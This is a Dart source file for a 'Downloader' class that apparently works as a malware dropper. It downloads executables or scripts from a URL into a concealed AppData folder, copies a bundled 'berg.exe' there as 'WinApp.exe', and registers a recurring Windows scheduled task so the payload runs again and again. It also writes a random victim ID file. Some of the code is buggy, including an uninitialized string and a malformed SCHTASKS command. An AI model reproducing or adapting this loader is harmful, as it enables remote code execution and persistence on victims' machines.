import 'package:dio/dio.dart';
import 'package:meta/meta.dart';
import "dart:io";
import 'dart:async';
import 'dart:math';

class Downloader {
  final String programID = 'WindowsClient';
  String extention;
  List<String> allowd_extentions = [".exe", ".msi", ".bat", ".vb", ".js"];

  Future validateAndDownload(String url) async {
    // check is Valid url.
    if (url.isNotEmpty &&
        allowd_extentions.contains(url.substring(url.length - 4))) {
      await downloader(
              dio: Dio(), url: url, extention: url.substring(url.length - 4))
          .whenComplete(() =>
              copier(programName: programID + url.substring(url.length - 4)))
          .whenComplete(() => addToTasks(
              programName: programID + url.substring(url.length - 4)));
    }
  }

  String get userProfile {
    var osData = Platform.environment;
    var userName = osData['UserProfile'];
    return userName.toString();
  }

  Future<String> copier({String programName}) async {
    try {
      await Directory('$userProfile\\appData\\Local\\Coner\\').create();
      var rfile = await File('berg.exe').readAsBytesSync();
      await File('$userProfile\\appData\\Local\\Coner\\WinApp.exe')
          .writeAsBytesSync(rfile);
      await addToTasks(programName: programName);
    } catch (e) {
      print(e);
    }
    return programName;
  }

  Future<Map<String, dynamic>> genrate({String path}) async {
    String id_key;
    var my_file = File(path + '//id.txt');
    var ran = Random();
    for (var i = 0; i < 10; i++) {
      id_key += ran.nextInt(100000).toString();
    }
    await my_file.writeAsStringSync(id_key);
    return {'key': id_key, 'file': my_file};
  }

  Future<String> checkAndGen() async {
    var myDir = Directory('$userProfile\\appData\\Local\\Coner\\');
    myDir
        .list(recursive: false, followLinks: false)
        .listen((FileSystemEntity entity) {
      if (!entity.path.endsWith('id.txt')) {
        genrate(path: myDir.path.toString());
      } else {
        return null;
      }
    });
  }

  void deleteReg() async {
    try {
      await Process.run('SCHTASKS /DELETE /TN "MyTasks\\Notepad task"', []);
    } catch (e) {
      print(e);
    }
  }

  // ignore: missing_return
  Future<bool> downloader({Dio dio, String url, String extention}) async {
    try {
      var response = await dio.get(url,
          options:
              Options(followRedirects: true, responseType: ResponseType.bytes));
      if (response.data != null) {
        List<int> data = response.data;
        await File('$userProfile\\appData\\Local\\Coner\\$programID$extention')
            .writeAsBytesSync(data);
        return true;
      }
    } catch (e) {
      print(e);
    }
  }

  // ignore: missing_return
  Future<bool> addToTasks({String programName}) async {
    await Process.run(
        'SCHTASKS /CREATE /SC  /mo 1 /TN "MyTasks\\ruun task" /TR $userProfile\\appData\\Local\\Coner\\$programName',
        []).then((process) {
      if (process.stdout.toString().startsWith("SUCCESS")) {
        return true;
      } else {
        return false;
      }
    });
  }
}
